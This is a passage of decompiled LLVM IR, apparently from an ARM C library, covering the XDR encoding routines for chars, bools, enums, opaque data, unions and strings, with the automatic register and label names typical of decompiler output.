  %v2_18584 = icmp eq i32 %v2_1857c, 0
  br i1 %v2_18584, label %dec_label_pc_185ac, label %dec_label_pc_1859c

dec_label_pc_1859c:                               ; preds = %dec_label_pc_18594
  %v7_1859c = icmp eq i32 %v2_1857c, 2
  store i1 %v7_1859c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_1859c, label %dec_label_pc_185fc, label %dec_label_pc_185f8

dec_label_pc_185ac:                               ; preds = %dec_label_pc_18594
  %v1_185ac = add i32 %arg2, 1
  %v2_185ac = inttoptr i32 %v1_185ac to i8*
  %v3_185ac = load i8, i8* %v2_185ac, align 1
  %v4_185ac = zext i8 %v3_185ac to i32
  %v1_185b0 = inttoptr i32 %arg2 to i8*
  %v2_185b0 = load i8, i8* %v1_185b0, align 1
  %v3_185b0 = zext i8 %v2_185b0 to i32
  %v4_185b4 = mul nuw nsw i32 %v4_185ac, 256
  %v5_185b4 = or i32 %v3_185b0, %v4_185b4
  store i32 %v5_185b4, i32* %r2.global-to-local, align 4
  store i8 %v2_185b0, i8* %stack_var_-16, align 1
  %v1_185c0 = add i32 %v0_1857c, 4
  %v2_185c0 = inttoptr i32 %v1_185c0 to i32*
  %v3_185c0 = load i32, i32* %v2_185c0, align 4
  %v1_185c8 = add i32 %v3_185c0, 4
  %v2_185c8 = inttoptr i32 %v1_185c8 to i32*
  %v3_185c8 = load i32, i32* %v2_185c8, align 4
  call void @__pseudo_branch(i32 %v3_185c8)
  br label %dec_label_pc_185fc

dec_label_pc_185d0:                               ; preds = %entry
  %v1_185d0 = add i32 %v0_1857c, 4
  %v2_185d0 = inttoptr i32 %v1_185d0 to i32*
  %v3_185d0 = load i32, i32* %v2_185d0, align 4
  %v1_185d8 = inttoptr i32 %v3_185d0 to i32*
  %v2_185d8 = load i32, i32* %v1_185d8, align 4
  call void @__pseudo_branch(i32 %v2_185d8)
  %v0_185dc = load i32, i32* %r0.global-to-local, align 4
  %v2_185dc = icmp eq i32 %v0_185dc, 0
  store i1 %v2_185dc, i1* %cpsr_z.global-to-local, align 1
  %v0_185e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_185e0, i32* %r0.global-to-local, align 4
  br i1 %v2_185dc, label %dec_label_pc_185f8, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_185d0
  %v3_185e4 = load i8, i8* %stack_var_-16, align 1
  %v4_185e4 = sext i8 %v3_185e4 to i32
  store i32 %v4_185e4, i32* %r2.global-to-local, align 4
  %v4_185e8 = sdiv i32 %v4_185e4, 256
  %v2_185ec = trunc i32 %v4_185e8 to i8
  %v3_185ec = load i32, i32* %r5.global-to-local, align 4
  %v4_185ec = add i32 %v3_185ec, 1
  %v5_185ec = inttoptr i32 %v4_185ec to i8*
  store i8 %v2_185ec, i8* %v5_185ec, align 1
  %v0_185f0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_185f0.pr.pr, label %dec_label_pc_185f8, label %.thread3

.thread3:                                         ; preds = %.thread2
  %v1_185f0 = load i32, i32* %r2.global-to-local, align 4
  %v2_185f0 = trunc i32 %v1_185f0 to i8
  %v3_185f0 = load i32, i32* %r5.global-to-local, align 4
  %v4_185f0 = inttoptr i32 %v3_185f0 to i8*
  store i8 %v2_185f0, i8* %v4_185f0, align 1
  %v0_185f4.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_185f4.pr.pr.pr, label %dec_label_pc_185f8, label %dec_label_pc_185fc

dec_label_pc_185f8:                               ; preds = %dec_label_pc_185d0, %.thread2, %.thread3, %dec_label_pc_1859c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_1859c, %.thread3, %dec_label_pc_185ac, %dec_label_pc_185f8
  %v2_18600 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18600, i32* %r4.global-to-local, align 4
  %v11_18600 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18600

; uselistorder directives
  uselistorder i32 %v2_1857c, { 0, 2, 1, 3 }
  uselistorder i8* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_185fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_185f8, { 2, 1, 0, 3 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_18604 = load i32, i32* @r4, align 4
  store i32 %v3_18604, i32* %stack_var_-8, align 4
  %v3_18608 = load i8, i8* %arg1, align 1
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i8 %v3_18608, i8* %stack_var_-12, align 1
  %v0_18620 = call i32 @__GI_xdr_int()
  store i32 %v0_18620, i32* %r0.global-to-local, align 4
  %v2_18624 = icmp eq i32 %v0_18620, 0
  br i1 %v2_18624, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_18628 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18630 = load i32, i32* %r4.global-to-local, align 4
  %v4_18630 = inttoptr i32 %v3_18630 to i8*
  store i8 %v3_18628, i8* %v4_18630, align 1
  %v8_18638.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v8_18638 = phi i32 [ 0, %entry ], [ %v8_18638.pre, %bb ]
  %v2_18638 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18638, i32* %r4.global-to-local, align 4
  ret i32 %v8_18638

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %v3_18640 = load i8, i8* %arg1, align 1
  %v2_18644 = ptrtoint i8* %stack_var_-12 to i32
  store i32 %tmp, i32* @r4, align 4
  store i8 %v3_18640, i8* %stack_var_-12, align 1
  store i32 %v2_18644, i32* @r1, align 4
  %v2_18658 = bitcast i8* %stack_var_-12 to i32*
  %v4_18658 = call i32 @xdr_u_int(i32* %v2_18658, i32* %v2_18658)
  store i32 %v4_18658, i32* %r0.global-to-local, align 4
  %v2_1865c = icmp eq i32 %v4_18658, 0
  br i1 %v2_1865c, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_18660 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18668 = load i32, i32* @r4, align 4
  %v4_18668 = inttoptr i32 %v3_18668 to i8*
  store i8 %v3_18660, i8* %v4_18668, align 1
  %v8_18670.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v8_18670 = phi i32 [ 0, %entry ], [ %v8_18670.pre, %bb ]
  ret i32 %v8_18670

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 3, 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18674 = load i32, i32* @r4, align 4
  store i32 %v3_18674, i32* %stack_var_-12, align 4
  %v0_18678 = load i32, i32* %r0.global-to-local, align 4
  %v1_18678 = inttoptr i32 %v0_18678 to i32*
  %v2_18678 = load i32, i32* %v1_18678, align 4
  store i32 %v2_18678, i32* %r4.global-to-local, align 4
  %v7_18680 = icmp eq i32 %v2_18678, 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_18680, label %dec_label_pc_186cc, label %dec_label_pc_18690

dec_label_pc_18690:                               ; preds = %entry
  %v2_18680 = icmp eq i32 %v2_18678, 0
  br i1 %v2_18680, label %dec_label_pc_186a8, label %dec_label_pc_18698

dec_label_pc_18698:                               ; preds = %dec_label_pc_18690
  %v7_18698 = icmp eq i32 %v2_18678, 2
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_18698, label %dec_label_pc_186fc, label %dec_label_pc_186f8

dec_label_pc_186a8:                               ; preds = %dec_label_pc_18690
  %v1_186a8 = inttoptr i32 %arg2 to i32*
  %v2_186a8 = load i32, i32* %v1_186a8, align 4
  %v2_186ac = icmp eq i32 %v2_186a8, 0
  br i1 %v2_186ac, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_186a8
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_186a8, %bb
  %v0_186b8 = phi i32 [ 0, %dec_label_pc_186a8 ], [ 1, %bb ]
  %v1_186b4 = add i32 %v0_18678, 4
  %v2_186b4 = inttoptr i32 %v1_186b4 to i32*
  %v3_186b4 = load i32, i32* %v2_186b4, align 4
  store i32 %v0_186b8, i32* %stack_var_-16, align 4
  %v1_186c4 = add i32 %v3_186b4, 4
  %v2_186c4 = inttoptr i32 %v1_186c4 to i32*
  %v3_186c4 = load i32, i32* %v2_186c4, align 4
  call void @__pseudo_branch(i32 %v3_186c4)
  br label %dec_label_pc_186fc

dec_label_pc_186cc:                               ; preds = %entry
  %v1_186cc = add i32 %v0_18678, 4
  %v2_186cc = inttoptr i32 %v1_186cc to i32*
  %v3_186cc = load i32, i32* %v2_186cc, align 4
  %v1_186d4 = inttoptr i32 %v3_186cc to i32*
  %v2_186d4 = load i32, i32* %v1_186d4, align 4
  call void @__pseudo_branch(i32 %v2_186d4)
  %v0_186d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_186d8 = icmp eq i32 %v0_186d8, 0
  %v0_186dc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_186dc, i32* %r0.global-to-local, align 4
  br i1 %v2_186d8, label %dec_label_pc_186f8, label %dec_label_pc_186e4

dec_label_pc_186e4:                               ; preds = %dec_label_pc_186cc
  %v2_186e4 = load i32, i32* %stack_var_-16, align 4
  %v2_186e8 = icmp eq i32 %v2_186e4, 0
  br i1 %v2_186e8, label %bb10, label %bb9

bb9:                                              ; preds = %dec_label_pc_186e4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_186e4, %bb9
  %v0_186f0 = phi i32 [ 0, %dec_label_pc_186e4 ], [ 1, %bb9 ]
  %v1_186f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_186f0 = inttoptr i32 %v1_186f0 to i32*
  store i32 %v0_186f0, i32* %v2_186f0, align 4
  br label %dec_label_pc_186fc

dec_label_pc_186f8:                               ; preds = %dec_label_pc_18698, %dec_label_pc_186cc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_186fc

dec_label_pc_186fc:                               ; preds = %dec_label_pc_18698, %bb10, %bb8, %dec_label_pc_186f8
  %v2_18700 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18700, i32* %r4.global-to-local, align 4
  %v11_18700 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18700

; uselistorder directives
  uselistorder i32 %v2_18678, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_186fc, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_186f8, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_18704 = call i32 @__GI_xdr_long()
  ret i32 %v0_18704
}

define i32 @xdr_opaque(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_18708 = icmp eq i32 %arg3, 0
  %v3_1870c = load i32, i32* @r4, align 4
  store i32 %v3_1870c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_18708, label %dec_label_pc_187b8, label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %entry
  %v2_18718 = load i32, i32* %arg1, align 4
  %v1_1871c = urem i32 %arg3, 4
  %v2_1871c = icmp eq i32 %v1_1871c, 0
  %v2_18724 = sub nsw i32 4, %v1_1871c
  %storemerge = select i1 %v2_1871c, i32 0, i32 %v2_18724
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_18728 = icmp eq i32 %v2_18718, 1
  br i1 %v7_18728, label %dec_label_pc_18758, label %dec_label_pc_18730

dec_label_pc_18730:                               ; preds = %dec_label_pc_18718
  %v2_18728 = icmp eq i32 %v2_18718, 0
  br i1 %v2_18728, label %dec_label_pc_18794, label %dec_label_pc_18734

dec_label_pc_18734:                               ; preds = %dec_label_pc_18730
  %v7_18734 = icmp eq i32 %v2_18718, 2
  br i1 %v7_18734, label %dec_label_pc_187b8, label %dec_label_pc_187c0

dec_label_pc_18758:                               ; preds = %dec_label_pc_18718
  %v1_18744 = add i32 %tmp, 4
  %v2_18744 = inttoptr i32 %v1_18744 to i32*
  %v3_18744 = load i32, i32* %v2_18744, align 4
  store i32 100176, i32* @lr, align 4
  %v1_1874c = add i32 %v3_18744, 8
  %v2_1874c = inttoptr i32 %v1_1874c to i32*
  %v3_1874c = load i32, i32* %v2_1874c, align 4
  call void @__pseudo_branch(i32 %v3_1874c)
  %v0_18758 = load i32, i32* %r5.global-to-local, align 4
  %v2_18758 = icmp eq i32 %v0_18758, 0
  br i1 %v2_18758, label %dec_label_pc_187b8, label %dec_label_pc_18760

dec_label_pc_18760:                               ; preds = %dec_label_pc_18758
  %v0_18760 = load i32, i32* %r4.global-to-local, align 4
  %v1_18768 = add i32 %v0_18760, 4
  %v2_18768 = inttoptr i32 %v1_18768 to i32*
  %v3_18768 = load i32, i32* %v2_18768, align 4
  store i32 100216, i32* @lr, align 4
  %v1_18774 = add i32 %v3_18768, 8
  %v2_18774 = inttoptr i32 %v1_18774 to i32*
  %v3_18774 = load i32, i32* %v2_18774, align 4
  call void @__pseudo_branch(i32 %v3_18774)
  %v2_18778 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18778, i32* @r4, align 4
  ret i32 %v0_18760

dec_label_pc_18794:                               ; preds = %dec_label_pc_18730
  %v1_18780 = add i32 %tmp, 4
  %v2_18780 = inttoptr i32 %v1_18780 to i32*
  %v3_18780 = load i32, i32* %v2_18780, align 4
  store i32 100236, i32* @lr, align 4
  %v1_18788 = add i32 %v3_18780, 12
  %v2_18788 = inttoptr i32 %v1_18788 to i32*
  %v3_18788 = load i32, i32* %v2_18788, align 4
  call void @__pseudo_branch(i32 %v3_18788)
  %v0_18794 = load i32, i32* %r5.global-to-local, align 4
  %v2_18794 = icmp eq i32 %v0_18794, 0
  br i1 %v2_18794, label %dec_label_pc_187b8, label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_18794
  %v0_1879c = load i32, i32* %r4.global-to-local, align 4
  %v1_187a4 = add i32 %v0_1879c, 4
  %v2_187a4 = inttoptr i32 %v1_187a4 to i32*
  %v3_187a4 = load i32, i32* %v2_187a4, align 4
  store i32 100276, i32* @lr, align 4
  %v1_187b0 = add i32 %v3_187a4, 12
  %v2_187b0 = inttoptr i32 %v1_187b0 to i32*
  %v3_187b0 = load i32, i32* %v2_187b0, align 4
  call void @__pseudo_branch(i32 %v3_187b0)
  %v2_187b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_187b4, i32* @r4, align 4
  ret i32 %v0_1879c

dec_label_pc_187b8:                               ; preds = %dec_label_pc_18734, %dec_label_pc_18794, %dec_label_pc_18758, %entry
  %v2_187bc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_187bc, i32* @r4, align 4
  ret i32 1

dec_label_pc_187c0:                               ; preds = %dec_label_pc_18734
  store i32 %v3_1870c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1871c, { 1, 0 }
  uselistorder i32 %v2_18718, { 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_187b8, { 1, 2, 0, 3 }
}

define i32 @xdr_union(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_187d0 = load i32, i32* @r4, align 4
  store i32 %v3_187d0, i32* %stack_var_-24, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %v0_187d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_187d8, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %arg4, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r6.global-to-local, align 4
  %v0_187e8 = call i32 @xdr_enum()
  %v2_187ec = icmp eq i32 %v0_187e8, 0
  br i1 %v2_187ec, label %dec_label_pc_18850, label %dec_label_pc_1880c.preheader

dec_label_pc_1880c.preheader:                     ; preds = %entry
  %v1_187f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_187f0 = inttoptr i32 %v1_187f0 to i32*
  %v3_187f0 = load i32, i32* %v2_187f0, align 4
  store i32 %v3_187f0, i32* %r1.global-to-local, align 4
  %v0_1880c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1880c

dec_label_pc_187fc:                               ; preds = %dec_label_pc_1880c
  %v1_187fc = inttoptr i32 %v0_18804 to i32*
  %v2_187fc = load i32, i32* %v1_187fc, align 4
  %v9_18800 = icmp eq i32 %v2_187fc, %v3_187f0
  %v1_18804 = add i32 %v0_18804, 8
  store i32 %v1_18804, i32* %r4.global-to-local, align 4
  br i1 %v9_18800, label %dec_label_pc_18838, label %dec_label_pc_1880c

dec_label_pc_1880c:                               ; preds = %dec_label_pc_1880c.preheader, %dec_label_pc_187fc
  %v0_18804 = phi i32 [ %v0_1880c.pre, %dec_label_pc_1880c.preheader ], [ %v1_18804, %dec_label_pc_187fc ]
  %v1_1880c = add i32 %v0_18804, 4
  %v2_1880c = inttoptr i32 %v1_1880c to i32*
  %v3_1880c = load i32, i32* %v2_1880c, align 4
  %v2_18810 = icmp eq i32 %v3_1880c, 0
  br i1 %v2_18810, label %dec_label_pc_18818, label %dec_label_pc_187fc

dec_label_pc_18818:                               ; preds = %dec_label_pc_1880c
  %v0_18818 = load i32, i32* %r8.global-to-local, align 4
  %v2_18818 = icmp eq i32 %v0_18818, 0
  br i1 %v2_18818, label %dec_label_pc_18850, label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18818
  %v0_18824 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_18824, i32* %r1.global-to-local, align 4
  %v1_18830 = call i32 @unknown_0()
  %v2_18834 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18834, i32* %r4.global-to-local, align 4
  ret i32 %v1_18830

dec_label_pc_18838:                               ; preds = %dec_label_pc_187fc
  %v0_18838 = load i32, i32* %r6.global-to-local, align 4
  %v0_1883c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1883c, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_1880c)
  %v2_1884c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1884c, i32* %r4.global-to-local, align 4
  ret i32 %v0_18838

dec_label_pc_18850:                               ; preds = %entry, %dec_label_pc_18818
  %v2_18854 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_18854, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_18804, { 2, 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 ()* @xdr_enum, { 4, 5, 1, 3, 6, 2, 0 }
  uselistorder label %dec_label_pc_18850, { 1, 0 }
  uselistorder label %dec_label_pc_1880c, { 1, 0 }
}

define i32 @__GI_xdr_string(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_18858 = load i32, i32* @r4, align 4
  store i32 %v3_18858, i32* %stack_var_-20, align 4
  %v6_18858 = load i32, i32* @r5, align 4
  %v9_18858 = load i32, i32* @r6, align 4
  %v12_18858 = load i32, i32* @r7, align 4
  %v2_1885c = load i32, i32* %arg1, align 4
  %v2_18860 = icmp eq i32 %v2_1885c, 0
  %v2_18864 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_18874 = inttoptr i32 %arg2 to i32*
  %v2_18874 = load i32, i32* %v1_18874, align 4
  store i32 %v2_18874, i32* @r4, align 4
  br i1 %v2_18860, label %dec_label_pc_18890, label %dec_label_pc_1887c

dec_label_pc_1887c:                               ; preds = %entry
  %v7_1887c = icmp eq i32 %v2_1885c, 2
  br i1 %v7_1887c, label %dec_label_pc_18884, label %dec_label_pc_188a4

dec_label_pc_18884:                               ; preds = %dec_label_pc_1887c
  %v2_18884 = icmp eq i32 %v2_18874, 0
  br i1 %v2_18884, label %dec_label_pc_18954, label %dec_label_pc_18898

dec_label_pc_18890:                               ; preds = %entry
  %v2_18890 = icmp eq i32 %v2_18874, 0
  br i1 %v2_18890, label %dec_label_pc_1895c, label %dec_label_pc_18898

dec_label_pc_18898:                               ; preds = %dec_label_pc_18884, %dec_label_pc_18890
  %v1_18898 = inttoptr i32 %v2_18874 to i8*
  store i32 %v2_18874, i32* %r0.global-to-local, align 4
  %v3_1889c = call i32 @strlen(i8* %v1_18898)
  store i32 %v3_1889c, i32* %r0.global-to-local, align 4
  store i32 %v3_1889c, i32* %stack_var_-24, align 4
  %v0_188a4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_188a4

dec_label_pc_188a4:                               ; preds = %dec_label_pc_1887c, %dec_label_pc_18898
  %v0_188a4 = phi i32 [ %tmp, %dec_label_pc_1887c ], [ %v0_188a4.pre, %dec_label_pc_18898 ]
  store i32 %v0_188a4, i32* @r0, align 4
  store i32 %v2_18864, i32* @r1, align 4
  %v2_188ac = inttoptr i32 %v0_188a4 to i32*
  %v4_188ac = call i32 @xdr_u_int(i32* %v2_188ac, i32* nonnull %stack_var_-24)
  store i32 %v4_188ac, i32* %r0.global-to-local, align 4
  %v2_188b0 = icmp eq i32 %v4_188ac, 0
  br i1 %v2_188b0, label %dec_label_pc_1895c, label %dec_label_pc_188b8

dec_label_pc_188b8:                               ; preds = %dec_label_pc_188a4
  %v2_188b8 = load i32, i32* %stack_var_-24, align 4
  %v1_188bc = load i32, i32* @r7, align 4
  %tmp14 = icmp ugt i32 %v2_188b8, %v1_188bc
  br i1 %tmp14, label %dec_label_pc_1895c, label %dec_label_pc_188c4

dec_label_pc_188c4:                               ; preds = %dec_label_pc_188b8
  %v0_188c4 = load i32, i32* @r5, align 4
  %v1_188c4 = inttoptr i32 %v0_188c4 to i32*
  %v2_188c4 = load i32, i32* %v1_188c4, align 4
  %v7_188c8 = icmp eq i32 %v2_188c4, 1
  br i1 %v7_188c8, label %dec_label_pc_188e0, label %dec_label_pc_188d0

dec_label_pc_188d0:                               ; preds = %dec_label_pc_188c4
  %v2_188c8 = icmp eq i32 %v2_188c4, 0
  br i1 %v2_188c8, label %dec_label_pc_18928, label %dec_label_pc_188d4

dec_label_pc_188d4:                               ; preds = %dec_label_pc_188d0
  %v7_188d4 = icmp eq i32 %v2_188c4, 2
  br i1 %v7_188d4, label %dec_label_pc_1893c, label %dec_label_pc_1895c

dec_label_pc_188e0:                               ; preds = %dec_label_pc_188c4
  %v1_188e0 = add i32 %v2_188b8, 1
  store i32 %v1_188e0, i32* %r0.global-to-local, align 4
  %v7_188e0 = icmp eq i32 %v1_188e0, 0
  br i1 %v7_188e0, label %dec_label_pc_18954, label %dec_label_pc_188e8

dec_label_pc_188e8:                               ; preds = %dec_label_pc_188e0
  %v0_188e8 = load i32, i32* @r4, align 4
  %v2_188e8 = icmp eq i32 %v0_188e8, 0
  br i1 %v2_188e8, label %dec_label_pc_188f0, label %dec_label_pc_1891c

dec_label_pc_188f0:                               ; preds = %dec_label_pc_188e8
  %v1_188f0 = call i32 @malloc(i32 %v1_188e0)
  store i32 %v1_188f0, i32* %r0.global-to-local, align 4
  %v2_188f4 = icmp eq i32 %v1_188f0, 0
  store i32 %v1_188f0, i32* @r4, align 4
  %v1_188fc = load i32, i32* @r6, align 4
  %v2_188fc = inttoptr i32 %v1_188fc to i32*
  store i32 %v1_188f0, i32* %v2_188fc, align 4
  br i1 %v2_188f4, label %dec_label_pc_18904, label %dec_label_pc_188f0.dec_label_pc_1891c_crit_edge

dec_label_pc_188f0.dec_label_pc_1891c_crit_edge:  ; preds = %dec_label_pc_188f0
  %v2_1891c.pre = load i32, i32* %stack_var_-24, align 4
  %v2_18924.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1891c

dec_label_pc_18904:                               ; preds = %dec_label_pc_188f0
  store i32 ptrtoint ([27 x i8]* @global_var_1e96c.917 to i32), i32* %r0.global-to-local, align 4
  %v2_1890c = load i32, i32* @global_var_2b570, align 4
  %v3_18910 = call i32 @__GI_fputs(i32 ptrtoint ([27 x i8]* @global_var_1e96c.917 to i32), i32 %v2_1890c)
  %v0_18914 = load i32, i32* @r4, align 4
  store i32 %v0_18914, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_1891c:                               ; preds = %dec_label_pc_188f0.dec_label_pc_1891c_crit_edge, %dec_label_pc_188e8
  %v2_18924 = phi i32 [ %v2_18924.pre, %dec_label_pc_188f0.dec_label_pc_1891c_crit_edge ], [ %v0_188e8, %dec_label_pc_188e8 ]
  %v2_1891c = phi i32 [ %v2_1891c.pre, %dec_label_pc_188f0.dec_label_pc_1891c_crit_edge ], [ %v2_188b8, %dec_label_pc_188e8 ]
  %v4_18924 = add i32 %v2_1891c, %v2_18924
  %v5_18924 = inttoptr i32 %v4_18924 to i8*
  store i8 0, i8* %v5_18924, align 1
  %v0_18928.pre = load i32, i32* @r5, align 4
  %v2_18930.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %dec_label_pc_188d0, %dec_label_pc_1891c
  %v2_18930 = phi i32 [ %v2_188b8, %dec_label_pc_188d0 ], [ %v2_18930.pre, %dec_label_pc_1891c ]
  %v0_18928 = phi i32 [ %v0_188c4, %dec_label_pc_188d0 ], [ %v0_18928.pre, %dec_label_pc_1891c ]
  store i32 %v0_18928, i32* %r0.global-to-local, align 4
  %v0_1892c = load i32, i32* @r4, align 4
  %v3_18934 = inttoptr i32 %v0_18928 to i32*
  %v4_18934 = call i32 @xdr_opaque(i32* %v3_18934, i32 %v0_1892c, i32 %v2_18930)
  store i32 %v4_18934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_1893c:                               ; preds = %dec_label_pc_188d4
  %v0_1893c = load i32, i32* @r4, align 4
  store i32 %v0_1893c, i32* @r0, align 4
  %v0_18940 = call i32 @free()
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1894c = load i32, i32* @r6, align 4
  %v2_1894c = inttoptr i32 %v1_1894c to i32*
  store i32 0, i32* %v2_1894c, align 4
  %v17_18964.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_18954:                               ; preds = %dec_label_pc_18884, %dec_label_pc_188e0
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_1895c:                               ; preds = %dec_label_pc_188d4, %dec_label_pc_188b8, %dec_label_pc_188a4, %dec_label_pc_18890
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18960

dec_label_pc_18960:                               ; preds = %dec_label_pc_18954, %dec_label_pc_1893c, %dec_label_pc_18928, %dec_label_pc_18904, %dec_label_pc_1895c
  %v17_18964 = phi i32 [ 1, %dec_label_pc_18954 ], [ %v17_18964.pre, %dec_label_pc_1893c ], [ %v4_18934, %dec_label_pc_18928 ], [ %v0_18914, %dec_label_pc_18904 ], [ 0, %dec_label_pc_1895c ]
  %v2_18964 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18964, i32* @r4, align 4
  store i32 %v6_18858, i32* @r5, align 4
  store i32 %v9_18858, i32* @r6, align 4
  store i32 %v12_18858, i32* @r7, align 4
  ret i32 %v17_18964

; uselistorder directives
  uselistorder i32 %v0_18928, { 1, 0 }
  uselistorder i32 %v1_188f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_188c4, { 0, 2, 1 }
